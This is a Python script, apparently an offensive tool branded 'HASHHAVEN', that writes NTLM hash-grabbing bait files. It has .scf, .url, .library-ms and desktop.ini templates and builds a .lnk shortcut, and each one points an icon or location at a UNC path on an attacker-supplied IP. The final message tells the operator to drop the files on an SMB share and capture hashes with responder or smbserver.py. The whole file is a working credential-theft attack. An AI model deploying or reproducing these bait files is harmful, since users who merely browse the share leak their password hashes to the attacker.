import random
import os
from time import sleep
from pylnk3 import Lnk

# Banner with rainbow color effect
BANNER = """
\033[91m██╗  ██╗ █████╗ ███████╗██╗  ██╗██╗  ██╗ █████╗ ██╗   ██╗███████╗███╗   ██╗
██║  ██║██╔══██╗██╔════╝██║  ██║██║  ██║██╔══██╗██║   ██║██╔════╝████╗  ██║
███████║███████║███████╗███████║███████║███████║██║   ██║█████╗  ██╔██╗ ██║
██╔══██║██╔══██║╚════██║██╔══██║██╔══██║██╔══██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║
██║  ██║██║  ██║███████║██║  ██║██║  ██║██║  ██║ ╚████╔╝ ███████╗██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝
                                                                           
\033[0m
"""

# Templates
scf_template = '''
[Shell]
Command=2
IconFile=\\\\{}\\x\\{}.ico
[Taskbar]
Command=ToggleDesktop
'''

url_template = '''
[InternetShortcut]
URL=http://{}/x/{}.html
IconIndex=1
IconFile=\\\\{}\\x\\{}.ico
'''

lib_template = '''
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType><§7d49d726-3c21-4f05-99aa-fdc2c9474656§></folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\\\{}\\x\\{}</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
'''

ini_template = '''
[.ShellClassInfo]
IconResource=\\\\{}\\x\\{}
IconIndex={}
'''


def generate():
    print(BANNER)
    ip = input("\033[1;31mEnter attacker IP: \033[0m")
    out = input("\033[1;33mEnter output name: \033[0m")
    print("\033[1;33m[*] Generating hash grabbing files..\033[0m")
    # scf
    scf_payload = scf_template.format(ip, f"scf_{random.randint(0, 1000)}")
    fname = f'@{out}.scf'
    with open(fname, 'w+') as f:
        f.write(scf_payload)
        print("\033[1;33m[*] Written {}\033[0m".format(fname))

    # lnk
    skeleton_path = f"{os.path.dirname(os.path.abspath(__file__))}/skel"
    fname =f"lnk_{random.randint(0, 1000)}.ico"
    path = f"pylnk3 c \\\\\\\\{ip}\\\\x\\\\{fname} {skeleton_path}.lnk"
    os.system(path)
    sleep(1)
    lnk = Lnk(skeleton_path)
    lnk.icon = f'\\\\{ip}\\x\\{fname}'
    lnk.save(f'{out}.lnk')
    print("\033[1;33m[*] Written {}\033[0m".format(fname))
    print("\033[1;32m[+] Done, upload files to smb share and capture hashes with smbserver.py/responder\033[0m")


if __name__ == "__main__":
    generate()
